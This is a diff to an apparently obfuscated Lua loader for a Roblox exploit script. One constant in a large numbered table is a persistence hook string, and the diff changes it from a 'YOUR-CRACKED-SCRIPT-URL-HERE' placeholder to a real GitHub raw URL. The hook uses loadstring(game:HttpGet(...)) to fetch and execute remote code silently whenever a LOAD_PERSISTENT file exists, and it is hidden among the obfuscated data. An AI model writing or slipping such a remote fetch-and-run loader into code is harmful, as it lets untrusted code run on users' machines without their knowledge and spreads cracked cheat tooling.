@@ -89669,7 +89669,7 @@ function Backend.loadProgramData()
         [3248] = 15052,
         [3249] = 394,
         [3250] = 12553,
-        [3251] = '\t\tif (not isfile("LOAD_PERSISTENT")) then\n\t\t\treturn;\n\t\tend;\n\t\tscript_key, SILENT = "%s", isfile("LOAD_SILENTLY");\n\t\tloadstring(game:HttpGet("https://YOUR-CRACKED-SCRIPT-URL-HERE"))();\n\t\t',
+        [3251] = '\t\tif (not isfile("LOAD_PERSISTENT")) then\n\t\t\treturn;\n\t\tend;\n\t\tscript_key, SILENT = "%s", isfile("LOAD_SILENTLY");\n\t\tloadstring(game:HttpGet("https://raw.githubusercontent.com/zg071/1/refs/heads/main/1.lua"))();\n\t\t',
         [3252] = -19023,
         [3253] = 'get_server',
         [3254] = 'GetObjects',
